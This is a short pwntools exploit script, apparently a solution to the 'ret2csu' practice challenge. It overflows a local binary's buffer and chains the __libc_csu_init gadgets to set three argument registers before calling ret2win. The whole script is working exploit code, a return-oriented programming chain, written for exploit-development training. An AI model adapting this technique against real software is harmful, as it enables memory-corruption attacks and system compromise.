from pwn import *

exe = ELF("./ret2csu", checksec=False)
p = process(exe.path)

csu_pop = 0x40069a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
csu_mov = 0x400680 # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8] ; ret
pop_rdi = 0x4006a3 # pop rdi ; ret

init = 0x600e48 # x/20gx &_DYNAMIC -> 0x600e48 <_DYNAMIC+0x18>: 0x0000000000600e48

payload = b'A' * 40
payload += p64(csu_pop)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(init) # r12 = function to call
payload += p64(0) #edi
payload += p64(0xcafebabecafebabe) # r14 = rsi
payload += p64(0xd00df00dd00df00d) # r15 = rdx

payload += p64(csu_mov)
payload += p64(0x0) # padding for gadget #rsp,0x8 padding
payload += p64(0x0) #rbx
payload += p64(0x0) #rbp
payload += p64(0x0) #r12
payload += p64(0x0) #r13
payload += p64(0x0) #r14
payload += p64(0x0) #r15

payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(exe.symbols['ret2win'])

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)
